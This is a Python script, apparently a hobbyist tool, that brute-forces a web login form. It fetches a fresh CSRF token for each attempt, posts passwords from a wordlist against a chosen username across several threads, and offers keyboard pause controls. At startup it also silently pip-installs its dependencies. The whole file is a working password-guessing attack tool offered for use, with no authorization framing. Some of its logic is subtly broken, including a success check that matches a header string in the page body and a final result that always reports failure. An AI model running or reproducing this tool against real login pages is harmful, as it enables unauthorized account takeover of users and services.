# --- Auto-install dependencies ---
import subprocess
import sys

required = ['requests', 'beautifulsoup4', 'colorama', 'keyboard']
for package in required:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[❌] Failed to install {package}: {e}")



import requests
from bs4 import BeautifulSoup
import time
import random
import argparse
import threading
import queue
from colorama import init, Fore, Style
import keyboard  # new dependency
import string  # make sure this is at the top with your other imports
import sys
import time

def type_out(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


class SimpleBruteForcer:
    def __init__(self, url, username, wordlist, threads=5):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.passwords = queue.Queue()
        self.success_flag = threading.Event()
        self.paused = threading.Event()
        self.paused.clear()
        self.stop_flag = threading.Event()
        self.load_wordlist()
    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    cleaned = ''.join(char for char in line.strip() if char in string.printable)
                    if cleaned:
                        self.passwords.put(cleaned)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[💀] Wordlist loading interrupted by user.")
            sys.exit()




    def get_csrf_token(self, session):
        try:
            response = session.get(self.url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_elem = soup.find('input', {'name': 'csrf_token'})
            token = csrf_elem['value'] if csrf_elem else None
            return token
        except Exception as e:
            print(Fore.RED + f"[CSRF Fetch Error] {e}")
            return None

    def attempt_login(self, session, password):
        try:
            csrf_token = self.get_csrf_token(session)
            print(Fore.MAGENTA + "[CSRF] Fetching token...")
            if not csrf_token:
                return False

            data = {
                'username': self.username,
                'password': password,
                'csrf_token': csrf_token
            }

            response = session.post(self.url, data=data, timeout=10)

            if "Priority: u=1, i" in response.text:
                print(Fore.GREEN + f"[✅] Password found: {password}")
                self.success_flag.set()
                return True
            else:
                print(Fore.RED + f"[❌] Incorrect: {password}")
                return False

        except Exception as e:
            print(Fore.YELLOW + f"[Error] {e}")
            return False

    def worker(self):
        while not self.passwords.empty() and not self.success_flag.is_set() and not self.stop_flag.is_set():
            if self.paused.is_set():
                time.sleep(0.5)
                continue

            password = self.passwords.get()
            print(Fore.YELLOW + f"[THREAD] Trying: {password}")
            session = requests.Session()
            self.attempt_login(session, password)

    def control_listener(self):
        print(Fore.LIGHTBLUE_EX + "[🎮] Control listener active: CTRL+P = pause/resume, CTRL+C = quit.")
        while not self.stop_flag.is_set() and not self.success_flag.is_set():
            try:
                if keyboard.is_pressed("ctrl+p"):
                    if self.paused.is_set():
                        print(Fore.CYAN + "\n▶️ Resuming attack...")
                        self.paused.clear()
                    else:
                        print(Fore.MAGENTA + "\n⏸️ Pausing attack...")
                        self.paused.set()
                    time.sleep(1)  # debounce
            except:
                continue
            time.sleep(0.1)

    def run(self):
        try:
            print(Fore.CYAN + f"🚀 Launching brute-force with {self.threads} threads")
            listener = threading.Thread(target=self.control_listener, daemon=True)
            listener.start()

            thread_list = []
            for _ in range(self.threads):
                t = threading.Thread(target=self.worker)
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join()

            if not self.success_flag.is_set():
                print(Fore.RED + "❌ No valid password found.")
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] CTRL+C detected. Stopping threads...")
            self.stop_flag.set()

if __name__ == "__main__":
    print(Fore.GREEN + r"""
   ____             _       _                
  |  _ \ ___  _ __ | |_ ___| |__   ___ _ __  
  | |_) / _ \| '_ \| __/ __| '_ \ / _ \ '__| 
  |  _ < (_) | |_) | || (__| | | |  __/ |    
  |_| \_\___/| .__/ \__\___|_| |_|\___|_|    
             |_|      v1.0 by joshyboo25
""")

    
    type_out(Fore.GREEN + "🔥 Script started")
    
    parser = argparse.ArgumentParser(description="Stylized brute-force example")
    parser.add_argument("url", help="Login URL")
    parser.add_argument("username", help="Username to target")
    parser.add_argument("wordlist", help="Password wordlist file")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default is 5)")
    args = parser.parse_args()

    type_out(Fore.GREEN + f"🔗 Connecting to: {args.url}")
    type_out(Fore.GREEN + f"👤 Username: {args.username}")
    type_out(Fore.GREEN + f"📂 Wordlist: {args.wordlist}\n")

    bf = SimpleBruteForcer(args.url, args.username, args.wordlist, args.threads)
    success = bf.run()  # << this line should call run()

    if success:
        print(Fore.GREEN + "🎯 Brute-force successful.")
    else:
        print(Fore.RED + "❌ Brute-force failed.")



